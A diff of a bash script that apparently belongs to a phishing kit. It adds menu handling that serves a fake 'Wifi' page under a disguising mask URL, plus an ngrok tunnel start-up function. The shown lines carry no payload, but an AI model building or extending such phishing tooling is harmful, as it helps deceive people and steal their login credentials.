@@ -230,7 +230,15 @@ main_menu() {
 			website="Wifi"
 			mask='http://Wifi-security'
 			tunnel_menu;;
-		2 | 02)
+		0 | 00)
+                       msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
+	
+	esac
+}
+
 # ngrok 
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
